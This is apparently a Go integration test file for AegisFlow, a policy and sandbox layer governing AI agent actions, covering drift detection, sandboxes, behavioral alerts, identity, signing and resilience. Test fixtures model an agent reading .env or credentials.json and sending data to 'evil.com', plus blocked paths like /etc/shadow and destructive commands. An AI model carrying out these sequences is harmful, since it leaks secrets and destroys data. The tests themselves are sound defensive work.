package integration

import (
	"strings"
	"testing"
	"time"

	"github.com/saivedant169/AegisFlow/internal/behavioral"
	"github.com/saivedant169/AegisFlow/internal/envelope"
	"github.com/saivedant169/AegisFlow/internal/identity"
	"github.com/saivedant169/AegisFlow/internal/manifest"
	"github.com/saivedant169/AegisFlow/internal/resilience"
	"github.com/saivedant169/AegisFlow/internal/sandbox"
	"github.com/saivedant169/AegisFlow/internal/sqlgate"
	"github.com/saivedant169/AegisFlow/internal/supply"
)

// ========== TaskManifest + Drift (5 tests) ==========

func TestManifestRegistrationE2E(t *testing.T) {
	store := manifest.NewStore()

	m := &manifest.TaskManifest{
		ID:               "manifest-reg-1",
		TaskID:           "task-reg-1",
		Description:      "Test manifest registration",
		Owner:            "test-owner",
		ExpiresAt:        time.Now().Add(1 * time.Hour),
		AllowedTools:     []string{"github.list_*"},
		AllowedProtocols: []string{"git"},
		AllowedVerbs:     []string{"read"},
		MaxActions:       10,
		RiskTier:         "low",
	}

	if err := store.Register(m); err != nil {
		t.Fatalf("Register failed: %v", err)
	}

	// Verify it's stored and retrievable by ID.
	got, err := store.Get("manifest-reg-1")
	if err != nil {
		t.Fatalf("Get by ID failed: %v", err)
	}
	if got.TaskID != "task-reg-1" {
		t.Errorf("expected TaskID 'task-reg-1', got %q", got.TaskID)
	}
	if !got.Active {
		t.Error("expected manifest to be active after registration")
	}
	if got.ManifestHash == "" {
		t.Error("expected non-empty manifest hash after registration")
	}

	// Retrieve by task ID.
	byTask, err := store.GetByTaskID("task-reg-1")
	if err != nil {
		t.Fatalf("GetByTaskID failed: %v", err)
	}
	if byTask.ID != "manifest-reg-1" {
		t.Errorf("expected manifest ID 'manifest-reg-1', got %q", byTask.ID)
	}
}

func TestManifestDriftDetectionE2E(t *testing.T) {
	store := manifest.NewStore()
	detector := manifest.NewDriftDetector()

	m := &manifest.TaskManifest{
		ID:               "manifest-drift-1",
		TaskID:           "task-drift-1",
		Description:      "Only list operations allowed",
		Owner:            "test-owner",
		ExpiresAt:        time.Now().Add(1 * time.Hour),
		AllowedTools:     []string{"github.list_*"},
		AllowedProtocols: []string{"git"},
		MaxActions:       100,
		RiskTier:         "low",
	}

	if err := store.Register(m); err != nil {
		t.Fatalf("Register failed: %v", err)
	}

	actor := envelope.ActorInfo{Type: "agent", ID: "drift-agent"}
	env := envelope.NewEnvelope(actor, "task-drift-1", envelope.ProtocolGit, "github.delete_repo", "org/repo", envelope.CapDelete)

	events := detector.Check(m, env, 1, 0)
	store.RecordDrift(m.ID, events)

	// Should have at least an unexpected_tool drift event.
	drift := store.GetDrift(m.ID)
	if len(drift) == 0 {
		t.Fatal("expected at least one drift event for disallowed tool")
	}

	foundUnexpectedTool := false
	for _, d := range drift {
		if d.Type == manifest.DriftUnexpectedTool {
			foundUnexpectedTool = true
			if !strings.Contains(d.Message, "github.delete_repo") {
				t.Errorf("expected drift message to mention 'github.delete_repo', got %q", d.Message)
			}
		}
	}
	if !foundUnexpectedTool {
		t.Error("expected drift event of type 'unexpected_tool'")
	}
}

func TestManifestMaxActionsE2E(t *testing.T) {
	store := manifest.NewStore()
	detector := manifest.NewDriftDetector()

	m := &manifest.TaskManifest{
		ID:               "manifest-max-1",
		TaskID:           "task-max-1",
		Description:      "Max 3 actions",
		Owner:            "test-owner",
		ExpiresAt:        time.Now().Add(1 * time.Hour),
		AllowedTools:     []string{"github.list_*"},
		AllowedProtocols: []string{"git"},
		MaxActions:       3,
		RiskTier:         "low",
	}

	if err := store.Register(m); err != nil {
		t.Fatalf("Register failed: %v", err)
	}

	actor := envelope.ActorInfo{Type: "agent", ID: "max-agent"}

	// Send 4 actions; the 4th should trigger exceeded_max_actions.
	for i := 1; i <= 4; i++ {
		env := envelope.NewEnvelope(actor, "task-max-1", envelope.ProtocolGit, "github.list_repos", "org/repo", envelope.CapRead)
		events := detector.Check(m, env, i, 0)
		store.RecordDrift(m.ID, events)
	}

	drift := store.GetDrift(m.ID)
	foundExceeded := false
	for _, d := range drift {
		if d.Type == manifest.DriftExceededActions {
			foundExceeded = true
			if !strings.Contains(d.Message, "exceeds max") {
				t.Errorf("expected 'exceeds max' in message, got %q", d.Message)
			}
		}
	}
	if !foundExceeded {
		t.Error("expected drift event of type 'exceeded_max_actions' after 4th action")
	}
}

func TestManifestExpiredE2E(t *testing.T) {
	store := manifest.NewStore()
	detector := manifest.NewDriftDetector()

	m := &manifest.TaskManifest{
		ID:               "manifest-expired-1",
		TaskID:           "task-expired-1",
		Description:      "Very short-lived manifest",
		Owner:            "test-owner",
		ExpiresAt:        time.Now().Add(1 * time.Millisecond),
		AllowedTools:     []string{"github.list_*"},
		AllowedProtocols: []string{"git"},
		RiskTier:         "low",
	}

	if err := store.Register(m); err != nil {
		t.Fatalf("Register failed: %v", err)
	}

	// Wait for expiry.
	time.Sleep(5 * time.Millisecond)

	actor := envelope.ActorInfo{Type: "agent", ID: "expired-agent"}
	env := envelope.NewEnvelope(actor, "task-expired-1", envelope.ProtocolGit, "github.list_repos", "org/repo", envelope.CapRead)

	events := detector.Check(m, env, 1, 0)
	store.RecordDrift(m.ID, events)

	drift := store.GetDrift(m.ID)
	foundExpired := false
	for _, d := range drift {
		if d.Type == manifest.DriftExpiredManifest {
			foundExpired = true
		}
	}
	if !foundExpired {
		t.Error("expected drift event of type 'manifest_expired'")
	}
}

func TestManifestNoDriftE2E(t *testing.T) {
	store := manifest.NewStore()
	detector := manifest.NewDriftDetector()

	m := &manifest.TaskManifest{
		ID:               "manifest-nodrift-1",
		TaskID:           "task-nodrift-1",
		Description:      "All actions within scope",
		Owner:            "test-owner",
		ExpiresAt:        time.Now().Add(1 * time.Hour),
		AllowedTools:     []string{"github.list_*"},
		AllowedProtocols: []string{"git"},
		AllowedVerbs:     []string{"read"},
		MaxActions:       10,
		RiskTier:         "low",
	}

	if err := store.Register(m); err != nil {
		t.Fatalf("Register failed: %v", err)
	}

	actor := envelope.ActorInfo{Type: "agent", ID: "nodrift-agent"}

	// Send only allowed actions.
	for i := 1; i <= 3; i++ {
		env := envelope.NewEnvelope(actor, "task-nodrift-1", envelope.ProtocolGit, "github.list_repos", "org/repo", envelope.CapRead)
		events := detector.Check(m, env, i, 0)
		store.RecordDrift(m.ID, events)
	}

	drift := store.GetDrift(m.ID)
	if len(drift) != 0 {
		t.Errorf("expected zero drift events for allowed actions, got %d", len(drift))
	}
}

// ========== Sandbox (5 tests) ==========

func TestShellSandboxBlocksBinaryE2E(t *testing.T) {
	sb := &sandbox.ShellSandbox{
		AllowedBinaries: []string{"ls", "cat"},
	}

	// Allowed binary should pass.
	v := sb.Validate("ls", []string{"-la"}, "/tmp")
	if v != nil {
		t.Errorf("expected ls to be allowed, got violation: %v", v)
	}

	// rm should be rejected since it's not in the allowlist.
	v = sb.Validate("rm", []string{"-rf", "/tmp/foo"}, "/tmp")
	if v == nil {
		t.Fatal("expected rm to be rejected by shell sandbox")
	}
	if v.Rule != "allowed_binary" {
		t.Errorf("expected rule 'allowed_binary', got %q", v.Rule)
	}
	if !strings.Contains(v.Message, "rm") {
		t.Errorf("expected violation message to mention 'rm', got %q", v.Message)
	}
}

func TestShellSandboxBlocksPathE2E(t *testing.T) {
	sb := &sandbox.ShellSandbox{
		BlockedPaths: []string{"/etc/shadow", ".env"},
	}

	// Access to blocked path /etc/shadow should be rejected.
	v := sb.Validate("cat", []string{"/etc/shadow"}, "/home/user")
	if v == nil {
		t.Fatal("expected /etc/shadow access to be blocked")
	}
	if v.Rule != "blocked_path" {
		t.Errorf("expected rule 'blocked_path', got %q", v.Rule)
	}

	// Access to .env should be blocked (argument contains the path).
	v = sb.Validate("cat", []string{"./.env"}, "/home/user")
	if v == nil {
		t.Fatal("expected .env access to be blocked")
	}
	if v.Rule != "blocked_path" {
		t.Errorf("expected rule 'blocked_path', got %q", v.Rule)
	}
}

func TestSQLSandboxReadOnlyE2E(t *testing.T) {
	sb := &sandbox.SQLSandbox{
		ReadOnly: true,
	}

	// SELECT should be allowed.
	v := sb.Validate("SELECT * FROM users", sqlgate.SQLClassification{
		Operation: "select", Table: "users", HasWhereClause: false,
	})
	if v != nil {
		t.Errorf("expected SELECT to be allowed in read-only mode, got violation: %v", v)
	}

	// INSERT should be rejected.
	v = sb.Validate("INSERT INTO users (name) VALUES ('test')", sqlgate.SQLClassification{
		Operation: "insert", Table: "users",
	})
	if v == nil {
		t.Fatal("expected INSERT to be rejected in read-only mode")
	}
	if v.Rule != "read_only" {
		t.Errorf("expected rule 'read_only', got %q", v.Rule)
	}

	// UPDATE should be rejected.
	v = sb.Validate("UPDATE users SET name='foo'", sqlgate.SQLClassification{
		Operation: "update", Table: "users",
	})
	if v == nil {
		t.Fatal("expected UPDATE to be rejected in read-only mode")
	}

	// DELETE should be rejected.
	v = sb.Validate("DELETE FROM users WHERE id=1", sqlgate.SQLClassification{
		Operation: "delete", Table: "users", HasWhereClause: true,
	})
	if v == nil {
		t.Fatal("expected DELETE to be rejected in read-only mode")
	}
}

func TestSQLSandboxBlocksDDLE2E(t *testing.T) {
	sb := &sandbox.SQLSandbox{
		BlockDDL: true,
	}

	// DROP TABLE should be rejected.
	v := sb.Validate("DROP TABLE users", sqlgate.SQLClassification{
		Operation: "drop_table", Table: "users", IsDangerous: true,
	})
	if v == nil {
		t.Fatal("expected DROP TABLE to be rejected with block_ddl=true")
	}
	if v.Rule != "block_ddl" {
		t.Errorf("expected rule 'block_ddl', got %q", v.Rule)
	}
	if !strings.Contains(v.Message, "DDL") {
		t.Errorf("expected 'DDL' in message, got %q", v.Message)
	}

	// SELECT should still be allowed.
	v = sb.Validate("SELECT 1", sqlgate.SQLClassification{
		Operation: "select",
	})
	if v != nil {
		t.Errorf("expected SELECT to be allowed with block_ddl, got violation: %v", v)
	}
}

func TestGitSandboxBranchProtectionE2E(t *testing.T) {
	sb := &sandbox.GitSandbox{
		AllowedBranches: []string{"agent/*"},
	}

	// Write to "agent/fix-123" should be allowed.
	v := sb.Validate("push", "org/repo", "agent/fix-123", "")
	if v != nil {
		t.Errorf("expected push to agent/fix-123 to be allowed, got violation: %v", v)
	}

	// Write to "main" should be rejected.
	v = sb.Validate("push", "org/repo", "main", "")
	if v == nil {
		t.Fatal("expected push to main to be rejected by branch protection")
	}
	if v.Rule != "allowed_branch" {
		t.Errorf("expected rule 'allowed_branch', got %q", v.Rule)
	}
	if !strings.Contains(v.Message, "main") {
		t.Errorf("expected 'main' in violation message, got %q", v.Message)
	}
}

// ========== Behavioral (4 tests) ==========

func TestBehavioralExfiltrationE2E(t *testing.T) {
	rules := []behavioral.Rule{behavioral.ExfiltrationPattern{}}
	sa := behavioral.NewSessionAnalyzer("sess-exfil-1", rules, 0, 0)

	actor := envelope.ActorInfo{Type: "agent", ID: "exfil-agent"}

	// Step 1: read .env file.
	readEnv := envelope.NewEnvelope(actor, "task-exfil", envelope.ProtocolShell, "shell.cat", ".env", envelope.CapRead)
	sa.RecordAction(readEnv)

	// Step 2: curl to external host (HTTP write).
	curlExt := envelope.NewEnvelope(actor, "task-exfil", envelope.ProtocolHTTP, "curl", "https://evil.com/exfil", envelope.CapWrite)
	sa.RecordAction(curlExt)

	alerts := sa.Analyze()
	if len(alerts) == 0 {
		t.Fatal("expected exfiltration alert after read .env + external POST")
	}

	foundExfil := false
	for _, a := range alerts {
		if a.Rule == "exfiltration_pattern" {
			foundExfil = true
			if a.Severity != "critical" {
				t.Errorf("expected critical severity, got %q", a.Severity)
			}
		}
	}
	if !foundExfil {
		t.Error("expected alert with rule 'exfiltration_pattern'")
	}
}

func TestBehavioralDestructiveSequenceE2E(t *testing.T) {
	rules := []behavioral.Rule{behavioral.DestructiveSequence{Threshold: 3}}
	sa := behavioral.NewSessionAnalyzer("sess-destruct-1", rules, 0, 0)

	actor := envelope.ActorInfo{Type: "agent", ID: "destruct-agent"}

	// Record 3 consecutive delete actions.
	for i := 0; i < 3; i++ {
		del := envelope.NewEnvelope(actor, "task-destruct", envelope.ProtocolSQL, "sql.delete", "db/users", envelope.CapDelete)
		sa.RecordAction(del)
	}

	alerts := sa.Analyze()
	if len(alerts) == 0 {
		t.Fatal("expected destructive_sequence alert after 3 deletes")
	}

	foundDestructive := false
	for _, a := range alerts {
		if a.Rule == "destructive_sequence" {
			foundDestructive = true
			if a.RiskScore == 0 {
				t.Error("expected non-zero risk score for destructive sequence")
			}
		}
	}
	if !foundDestructive {
		t.Error("expected alert with rule 'destructive_sequence'")
	}
}

func TestBehavioralKillSwitchE2E(t *testing.T) {
	// Use all default rules with a kill switch threshold of 80.
	sa := behavioral.NewSessionAnalyzer("sess-kill-1", nil, 80, 0)

	actor := envelope.ActorInfo{Type: "agent", ID: "kill-agent"}

	// Trigger exfiltration pattern (40 risk) twice with different actions to
	// accumulate enough score to trip the kill switch.

	// First exfiltration: read secret, then external POST.
	readSecret1 := envelope.NewEnvelope(actor, "task-kill", envelope.ProtocolShell, "shell.cat", ".env", envelope.CapRead)
	sa.RecordAction(readSecret1)
	curlExt1 := envelope.NewEnvelope(actor, "task-kill", envelope.ProtocolHTTP, "curl", "https://evil.com/1", envelope.CapWrite)
	sa.RecordAction(curlExt1)

	sa.Analyze() // should trigger exfiltration (40 risk)

	// Now also trigger destructive sequence (25 risk).
	for i := 0; i < 3; i++ {
		del := envelope.NewEnvelope(actor, "task-kill", envelope.ProtocolSQL, "sql.delete", "db/table", envelope.CapDelete)
		sa.RecordAction(del)
	}

	sa.Analyze() // should trigger destructive_sequence (25 risk), total >= 65

	// Trigger credential abuse (35 risk) by reading a secret and making 2 external calls.
	readSecret2 := envelope.NewEnvelope(actor, "task-kill", envelope.ProtocolShell, "shell.cat", "credentials.json", envelope.CapRead)
	sa.RecordAction(readSecret2)
	httpCall1 := envelope.NewEnvelope(actor, "task-kill", envelope.ProtocolHTTP, "http.get", "https://api1.external.com", envelope.CapRead)
	sa.RecordAction(httpCall1)
	httpCall2 := envelope.NewEnvelope(actor, "task-kill", envelope.ProtocolHTTP, "http.get", "https://api2.external.com", envelope.CapRead)
	sa.RecordAction(httpCall2)

	sa.Analyze() // should trigger credential_abuse (35 risk), total >= 100

	riskScore := sa.SessionRiskScore()
	if riskScore < 80 {
		t.Errorf("expected cumulative risk score >= 80, got %d", riskScore)
	}

	if !sa.Blocked() {
		t.Error("expected session to be auto-blocked by kill switch")
	}
}

func TestBehavioralNormalSessionE2E(t *testing.T) {
	sa := behavioral.NewSessionAnalyzer("sess-normal-1", nil, 80, 0)

	actor := envelope.ActorInfo{Type: "agent", ID: "normal-agent"}

	// Record 10 normal read actions against non-sensitive targets.
	for i := 0; i < 10; i++ {
		read := envelope.NewEnvelope(actor, "task-normal", envelope.ProtocolSQL, "sql.select", "db/public_data", envelope.CapRead)
		sa.RecordAction(read)
	}

	alerts := sa.Analyze()
	if len(alerts) != 0 {
		t.Errorf("expected zero alerts for normal session, got %d", len(alerts))
	}

	riskScore := sa.SessionRiskScore()
	if riskScore != 0 {
		t.Errorf("expected risk score 0 for normal session, got %d", riskScore)
	}

	if sa.Blocked() {
		t.Error("expected normal session to not be blocked")
	}
}

// ========== Identity (3 tests) ==========

func TestIdentityHierarchyE2E(t *testing.T) {
	store := identity.NewStore()

	// Create org > team > project > environment.
	if err := store.CreateOrg(identity.Organization{ID: "org-1", Name: "Acme Corp"}); err != nil {
		t.Fatalf("CreateOrg failed: %v", err)
	}
	if err := store.CreateTeam(identity.Team{ID: "team-1", Name: "Platform", OrgID: "org-1"}); err != nil {
		t.Fatalf("CreateTeam failed: %v", err)
	}
	if err := store.CreateProject(identity.Project{ID: "proj-1", Name: "AegisFlow", TeamID: "team-1"}); err != nil {
		t.Fatalf("CreateProject failed: %v", err)
	}
	if err := store.CreateEnvironment(identity.Environment{
		ID: "env-prod", Name: "production", ProjectID: "proj-1", RiskTier: "critical",
	}); err != nil {
		t.Fatalf("CreateEnvironment failed: %v", err)
	}

	// Query hierarchy.
	org, err := store.GetOrg("org-1")
	if err != nil {
		t.Fatalf("GetOrg failed: %v", err)
	}
	if org.Name != "Acme Corp" {
		t.Errorf("expected org name 'Acme Corp', got %q", org.Name)
	}

	teams := store.GetTeamsForOrg("org-1")
	if len(teams) != 1 || teams[0].ID != "team-1" {
		t.Errorf("expected 1 team for org, got %d", len(teams))
	}

	projects := store.GetProjectsForTeam("team-1")
	if len(projects) != 1 || projects[0].ID != "proj-1" {
		t.Errorf("expected 1 project for team, got %d", len(projects))
	}

	envs := store.GetEnvironmentsForProject("proj-1")
	if len(envs) != 1 || envs[0].ID != "env-prod" {
		t.Errorf("expected 1 environment for project, got %d", len(envs))
	}
	if envs[0].RiskTier != "critical" {
		t.Errorf("expected risk tier 'critical', got %q", envs[0].RiskTier)
	}
}

func TestSeparationOfDutiesE2E(t *testing.T) {
	rules := identity.DefaultRules()

	// Actor with policy_author role tries to approve.
	actor := identity.Identity{
		ID:    "user-author",
		Type:  "human",
		Name:  "Policy Author",
		OrgID: "org-1",
		Roles: []identity.Role{
			{Name: "policy_author", Scope: "project", ScopeID: "proj-1"},
		},
	}

	err := identity.EvaluateRules(rules, actor, "approve_policy")
	if err == nil {
		t.Fatal("expected separation of duties rejection for policy_author trying to approve")
	}
	if !strings.Contains(err.Error(), "policy_author") {
		t.Errorf("expected error to mention 'policy_author', got %q", err.Error())
	}
	if !strings.Contains(err.Error(), "separation of duties") {
		t.Errorf("expected error to mention 'separation of duties', got %q", err.Error())
	}

	// A non-author actor should be allowed.
	nonAuthor := identity.Identity{
		ID:    "user-reviewer",
		Type:  "human",
		Name:  "Reviewer",
		OrgID: "org-1",
		Roles: []identity.Role{
			{Name: "approver", Scope: "project", ScopeID: "proj-1"},
		},
	}

	err = identity.EvaluateRules(rules, nonAuthor, "approve_policy")
	if err != nil {
		t.Errorf("expected non-author to be allowed to approve, got: %v", err)
	}
}

func TestIdentityRoleScopingE2E(t *testing.T) {
	store := identity.NewStore()

	// Create hierarchy.
	store.CreateOrg(identity.Organization{ID: "org-scope-1", Name: "Scoped Corp"})
	store.CreateTeam(identity.Team{ID: "team-scope-1", Name: "Engineering", OrgID: "org-scope-1"})
	store.CreateProject(identity.Project{ID: "proj-scope-1", Name: "Backend", TeamID: "team-scope-1"})

	// Identity with viewer role only at project scope.
	ident := identity.Identity{
		ID:    "agent-viewer-1",
		Type:  "agent",
		Name:  "Viewer Agent",
		OrgID: "org-scope-1",
		Roles: []identity.Role{
			{Name: "viewer", Scope: "project", ScopeID: "proj-scope-1"},
		},
	}
	if err := store.CreateIdentity(ident); err != nil {
		t.Fatalf("CreateIdentity failed: %v", err)
	}

	// Should have viewer role at project scope.
	projectRoles := store.GetRolesForScope("agent-viewer-1", "project", "proj-scope-1")
	if len(projectRoles) != 1 {
		t.Fatalf("expected 1 role at project scope, got %d", len(projectRoles))
	}
	if projectRoles[0].Name != "viewer" {
		t.Errorf("expected role 'viewer', got %q", projectRoles[0].Name)
	}

	// Should have NO roles at org scope.
	orgRoles := store.GetRolesForScope("agent-viewer-1", "org", "org-scope-1")
	if len(orgRoles) != 0 {
		t.Errorf("expected 0 roles at org scope, got %d", len(orgRoles))
	}

	// Should have NO roles at team scope.
	teamRoles := store.GetRolesForScope("agent-viewer-1", "team", "team-scope-1")
	if len(teamRoles) != 0 {
		t.Errorf("expected 0 roles at team scope, got %d", len(teamRoles))
	}
}

// ========== Supply Chain (3 tests) ==========

func TestSupplyChainSignVerifyE2E(t *testing.T) {
	key := []byte("test-hmac-key-256-bits-long!!")
	signer := supply.NewSigner(key)

	content := []byte("(module (func $main (export \"main\")))")

	bundle, err := signer.Sign("my-plugin", "1.0.0", "wasm_plugin", content)
	if err != nil {
		t.Fatalf("Sign failed: %v", err)
	}

	if bundle.Name != "my-plugin" {
		t.Errorf("expected name 'my-plugin', got %q", bundle.Name)
	}
	if bundle.TrustTier != "verified" {
		t.Errorf("expected trust tier 'verified', got %q", bundle.TrustTier)
	}
	if bundle.Signature == "" {
		t.Error("expected non-empty signature")
	}
	if bundle.ContentHash == "" {
		t.Error("expected non-empty content hash")
	}

	// Verify should pass with the same content.
	if err := signer.Verify(bundle, content); err != nil {
		t.Fatalf("Verify failed for valid content: %v", err)
	}
}

func TestSupplyChainTamperedContentE2E(t *testing.T) {
	key := []byte("test-hmac-key-256-bits-long!!")
	signer := supply.NewSigner(key)

	original := []byte("original extension content")
	bundle, err := signer.Sign("tamper-test", "1.0.0", "policy_pack", original)
	if err != nil {
		t.Fatalf("Sign failed: %v", err)
	}

	// Tamper with the content.
	tampered := []byte("tampered extension content")

	err = signer.Verify(bundle, tampered)
	if err == nil {
		t.Fatal("expected verification to fail for tampered content")
	}
	if !strings.Contains(err.Error(), "content hash mismatch") {
		t.Errorf("expected 'content hash mismatch' error, got %q", err.Error())
	}
}

func TestSupplyChainStrictModeE2E(t *testing.T) {
	key := []byte("test-hmac-key-256-bits-long!!")
	signer := supply.NewSigner(key)
	registry := supply.NewRegistry()

	// Strict mode verifier.
	strictVerifier := supply.NewVerifier(signer, true, registry)

	// Attempting to load unsigned content (nil bundle) should fail.
	err := strictVerifier.VerifyAndLoad(nil, []byte("unsigned content"))
	if err == nil {
		t.Fatal("expected strict mode to reject unsigned assets")
	}
	if !strings.Contains(err.Error(), "strict mode") {
		t.Errorf("expected 'strict mode' in error, got %q", err.Error())
	}

	// Permissive mode verifier should accept unsigned content.
	permissiveVerifier := supply.NewVerifier(signer, false, registry)
	err = permissiveVerifier.VerifyAndLoad(nil, []byte("unsigned content"))
	if err != nil {
		t.Errorf("expected permissive mode to accept unsigned assets, got: %v", err)
	}

	// Strict verifier should accept properly signed content.
	content := []byte("signed extension code")
	bundle, _ := signer.Sign("strict-test", "2.0.0", "connector", content)
	err = strictVerifier.VerifyAndLoad(bundle, content)
	if err != nil {
		t.Fatalf("expected strict verifier to accept valid signed bundle, got: %v", err)
	}

	// Verify asset was registered.
	assets := registry.ListAssets()
	if len(assets) != 1 {
		t.Fatalf("expected 1 registered asset, got %d", len(assets))
	}
	if assets[0].Name != "strict-test" {
		t.Errorf("expected asset name 'strict-test', got %q", assets[0].Name)
	}
	if !assets[0].Verified {
		t.Error("expected asset to be marked as verified")
	}
}

// ========== Resilience (3 tests) ==========

// staticChecker is a test HealthChecker that returns a fixed status.
type staticChecker struct {
	name   string
	status string
	msg    string
}

func (c *staticChecker) Check() resilience.ComponentHealth {
	return resilience.ComponentHealth{
		Name:    c.name,
		Status:  c.status,
		Message: c.msg,
	}
}

func TestHealthRegistryE2E(t *testing.T) {
	reg := resilience.NewHealthRegistry()

	reg.Register("PolicyEngine", &staticChecker{name: "PolicyEngine", status: "healthy", msg: "ok"})
	reg.Register("AuditLog", &staticChecker{name: "AuditLog", status: "unhealthy", msg: "disk full"})

	// Overall should not be healthy because AuditLog is unhealthy.
	if reg.IsHealthy() {
		t.Error("expected registry to not be healthy with an unhealthy component")
	}

	// Should be degraded (not all unhealthy).
	if !reg.IsDegraded() {
		t.Error("expected registry to be degraded with mixed health statuses")
	}

	// CheckAll should return 2 results.
	results := reg.CheckAll()
	if len(results) != 2 {
		t.Fatalf("expected 2 health check results, got %d", len(results))
	}

	healthyCounts := 0
	unhealthyCounts := 0
	for _, r := range results {
		switch r.Status {
		case "healthy":
			healthyCounts++
		case "unhealthy":
			unhealthyCounts++
		}
	}
	if healthyCounts != 1 || unhealthyCounts != 1 {
		t.Errorf("expected 1 healthy + 1 unhealthy, got %d healthy + %d unhealthy", healthyCounts, unhealthyCounts)
	}
}

func TestCircuitBreakerE2E(t *testing.T) {
	cb := resilience.NewCircuitBreaker("test-connector", 3, 50*time.Millisecond)

	// Initially closed.
	if cb.State() != resilience.CircuitClosed {
		t.Fatalf("expected initial state 'closed', got %q", cb.State())
	}
	if !cb.Allow() {
		t.Error("expected closed circuit to allow requests")
	}

	// Record failures past threshold.
	for i := 0; i < 3; i++ {
		cb.RecordFailure()
	}

	// Circuit should now be open.
	if cb.State() != resilience.CircuitOpen {
		t.Fatalf("expected state 'open' after 3 failures, got %q", cb.State())
	}
	if cb.Allow() {
		t.Error("expected open circuit to reject requests before reset period")
	}

	// Wait for reset period.
	time.Sleep(60 * time.Millisecond)

	// Should transition to half-open and allow a probe.
	if !cb.Allow() {
		t.Error("expected circuit to allow probe request after reset period")
	}
	if cb.State() != resilience.CircuitHalfOpen {
		t.Errorf("expected state 'half-open' after reset period, got %q", cb.State())
	}

	// Success should close the circuit.
	cb.RecordSuccess()
	if cb.State() != resilience.CircuitClosed {
		t.Errorf("expected state 'closed' after success, got %q", cb.State())
	}
}

func TestDegradationModesE2E(t *testing.T) {
	dm := resilience.NewDegradationManager()

	// Initially all components should be in normal mode.
	pe := dm.Get("PolicyEngine")
	if pe == nil {
		t.Fatal("expected PolicyEngine to be registered")
	}
	if pe.Mode != "normal" {
		t.Errorf("expected initial mode 'normal', got %q", pe.Mode)
	}

	// Set PolicyEngine to emergency mode.
	dm.SetEmergency("PolicyEngine")

	pe = dm.Get("PolicyEngine")
	if pe.Mode != "emergency" {
		t.Fatalf("expected mode 'emergency', got %q", pe.Mode)
	}
	if !strings.Contains(pe.Behavior, "safe defaults") {
		t.Errorf("expected emergency behavior to mention 'safe defaults', got %q", pe.Behavior)
	}
	if !strings.Contains(pe.SafetyImpact, "PolicyEngine") {
		t.Errorf("expected safety impact to mention 'PolicyEngine', got %q", pe.SafetyImpact)
	}

	// Set to degraded mode.
	dm.SetDegraded("PolicyEngine")
	pe = dm.Get("PolicyEngine")
	if pe.Mode != "degraded" {
		t.Errorf("expected mode 'degraded', got %q", pe.Mode)
	}
	if !strings.Contains(pe.Behavior, "fail-closed") {
		t.Errorf("expected degraded behavior to mention 'fail-closed', got %q", pe.Behavior)
	}

	// Restore to normal.
	dm.SetNormal("PolicyEngine")
	pe = dm.Get("PolicyEngine")
	if pe.Mode != "normal" {
		t.Errorf("expected mode 'normal' after recovery, got %q", pe.Mode)
	}
	if pe.SafetyImpact != "none" {
		t.Errorf("expected safety impact 'none' after recovery, got %q", pe.SafetyImpact)
	}
}
